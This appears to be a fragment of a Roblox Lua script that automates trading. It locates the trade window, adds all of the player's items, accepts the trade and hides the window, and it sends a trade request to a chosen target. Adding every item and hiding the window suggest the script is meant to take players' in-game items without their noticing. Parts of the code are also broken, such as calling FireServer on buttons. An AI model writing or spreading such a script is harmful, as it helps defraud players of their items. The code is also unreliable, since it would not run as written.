-- Trade functions with logging
local function getTradeGui()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then print("[DEBUG] PlayerGui not found"); return nil end
    local function findTrade(frame)
        for _, child in pairs(frame:GetChildren()) do
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("guı")) then
                print("[DEBUG] Found trade GUI frame: " .. child.Name)
                return child
            end
            local found = findTrade(child)
            if found then return found end
        end
        return nil
    end
    local result = findTrade(gui)
    if not result then print("[DEBUG] No trade GUI found") end
    return result
end

local function acceptTrade()
    local tradeGui = getTradeGui()
    if not tradeGui then print("[DEBUG] acceptTrade: no GUI") return false end
    for _, child in pairs(tradeGui:GetDescendants()) do
        if child:IsA("TextButton") and (child.Name:lower():find("accept") or child.Name:lower():find("confirm")) then
            print("[DEBUG] Found accept button: " .. child.Name)
            child:FireServer()
            tradeGui.Visible = false
            print("[DEBUG] Accept clicked and GUI hidden")
            return true
        end
    end
    print("[DEBUG] No accept button found")
    return false
end

local function addAllItems()
    local tradeGui = getTradeGui()
    if not tradeGui then print("[DEBUG] addAllItems: no GUI") return false end
    local count = 0
    for _, slot in pairs(tradeGui:GetDescendants()) do
        if slot:IsA("Frame") and (slot.Name:lower():find("slot") or slot.Name:lower():find("item")) then
            local btn = slot:FindFirstChild("Select") or slot:FindFirstChild("Add")
            if btn and btn:IsA("TextButton") then
                print("[DEBUG] Adding item: " .. slot.Name)
                btn:FireServer()
                count = count + 1
            end
        end
    end
    print("[DEBUG] Added " .. count .. " items")
    return count > 0
end

local function initiateTrade(target)
    for _, service in pairs(game:GetChildren()) do
        if service:IsA("ReplicatedStorage") then
            for _, obj in pairs(service:GetChildren()) do
                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
                    print("[DEBUG] Found trade remote: " .. obj.Name .. " in " .. service.Name)
                    obj:FireServer(target)
                    print("[DEBUG] Trade request fired to " .. target.Name)
                    return true
                end
            end
        end
    end
    print("[DEBUG] No trade remote found")
    return false
end

